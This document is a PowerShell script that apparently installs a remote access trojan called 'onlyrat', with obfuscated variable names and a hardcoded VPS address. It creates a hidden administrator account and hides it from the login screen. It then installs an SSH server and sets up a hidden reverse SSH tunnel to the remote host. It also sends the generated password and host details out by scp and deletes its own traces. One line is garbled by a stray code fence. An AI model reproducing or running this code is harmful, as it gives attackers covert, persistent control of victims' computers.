# TODO: Incorporate necessary payload installs

# Configuration Variables
$nkowFESgaO = "test" # Change me: VPS username
$ecPlmJVLRo = "167.88.169.219"  # Change me: VPS IP address
$ENyMAhIrsb = "22"       # Change me: Default VPS port [default 22]
$YlEQgBmePn = "2583"     # Change me: Routed VPS port [NOT TO DEFAULT SSH PORT]

$dERQpoZWxz = "$nkowFESgaO@$ecPlmJVLRo"

# Function to generate a random string
function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

# Function to create a local admin user
function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    try {
        Write-Host "[+] Creating local user: $sqbXFdLvyw"
        New-LocalUser  "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Host "[+] User $sqbXFdLvyw created successfully."
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Host "[+] User $sqbXFdLvyw added to the Administrators group."
    } catch {
        Write-Host "[-] Error creating user: $_"
        throw
    }
}

# Create the 'onlyrat' admin user
$sqbXFdLvyw = "onlyrat"
$DCilJFugpP = RpLGWiUsIy
Write-Host "[+] Generated password for $sqbXFdLvyw: $DCilJFugpP"

try {
    Remove-LocalUser  -Name $sqbXFdLvyw -ErrorAction SilentlyContinue
    Write-Host "[+] Removed existing user $sqbXFdLvyw (if any)."
} catch {
    Write-Host "[-] Error removing user: $_"
}

$CBFXIYeWPR = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $CBFXIYeWPR

# Hide the 'onlyrat' user from the login screen
$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$jmQikqoKMZ = '00000000'

try {
    If (-NOT (Test-Path $csfMFzvgEN)) {
        New-Item -Path $csfMFzvgEN -Force | Out-Null
        Write-Host "[+] Created registry key: $csfMFzvgEN"
    }
    New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
    Write-Host "[+] Hidden $sqbXFdLvyw from the login screen."
} catch {
    Write-Host "[-] Error modifying registry: $_"
}

# Install and configure OpenSSH
try {
    Write-Host "[+] Installing OpenSSH Server..."
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
    Write-Host "[+] OpenSSH Server installed successfully."
    Start-Service sshd
    Write-Host "[+] Started SSH service."
    Set-Service -Name sshd -StartupType 'Automatic'
    Write-Host "[+] Set SSH service to start automatically."
} catch {
    Write-Host "[-] Error configuring OpenSSH: $_"
}

# Add VPS to known hosts
try {
    New-Item -ItemType Directory -Path "$env:USERPROFILE\.ssh" -ErrorAction SilentlyContinue
    ssh-keyscan.exe -H $ecPlmJV ```powershell
LRo >> $env:USERPROFILE\.ssh\known_hosts
    Write-Host "[+] Added $ecPlmJVLRo to known hosts."
} catch {
    Write-Host "[-] Error adding to known hosts: $_"
}

# Create startup file for reverse SSH connection
$GlNweBEFmh = RpLGWiUsIy
$NyZnoLKCIs = Get-Location
$startupFilePath = "$NyZnoLKCIs/$GlNweBEFmh.cmd"

try {
    Add-Content -Path $startupFilePath -Value "@echo off"
    Add-Content -Path $startupFilePath -Value "powershell powershell.exe -windowstyle hidden -ep bypass `"ssh -o ServerAliveInterval=30 -o StrictHostKeyChecking=no -R $YlEQgBmePn`:localhost:22 $dERQpoZWxz -i $env:temp\key`""
    Write-Host "[+] Created startup file: $startupFilePath"
} catch {
    Write-Host "[-] Error creating startup file: $_"
}

# Prepare RAT file
$CRYnrkaDbe = "$env:User Name.rat"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

try {
    Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ # Local IP address
    Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP # Password
    Add-Content -Path $CRYnrkaDbe -Value $env:temp # Temp directory
    Add-Content -Path $CRYnrkaDbe -Value $NyZnoLKCIs # Startup path
    Add-Content -Path $CRYnrkaDbe -Value $ecPlmJVLRo # Remote host
    Add-Content -Path $CRYnrkaDbe -Value $YlEQgBmePn # Remote port
    Add-Content -Path $CRYnrkaDbe -Value 'remote' # Connection type
    Write-Host "[+] RAT file prepared: $CRYnrkaDbe"
} catch {
    Write-Host "[-] Error preparing RAT file: $_"
}

# Get key and send RAT
try {
    Invoke-WebRequest -Uri "http://$ecPlmJVLRo/key" -OutFile "$env:temp\key"
    Write-Host "[+] Key downloaded successfully."
    scp -P $ENyMAhIrsb -o StrictHostKeyChecking=no -i $env:temp\key -r $CRYnrkaDbe $dERQpoZWxz`:/home/$nkowFESgaO
    Write-Host "[+] RAT file sent to VPS."
} catch {
    Write-Host "[-] Error during key retrieval or file transfer: $_"
}

# Cleanup
try {
    Set-Location C:\Users
    attrib +h +s +r onlyrat 
    Set-Location $NyZnoLKCIs
    Remove-Item $CRYnrkaDbe -ErrorAction SilentlyContinue
    Remove-Item $GlNweBEFmh.cmd -ErrorAction SilentlyContinue
    Write-Host "[+] Cleanup completed."
} catch {
    Write-Host "[-] Error during cleanup: $_"
}

# Start the startup file
try {
    start "$startupFilePath"
    Write-Host "[+] Startup file executed."
} catch {
    Write-Host "[-] Error starting the startup file: $_"
}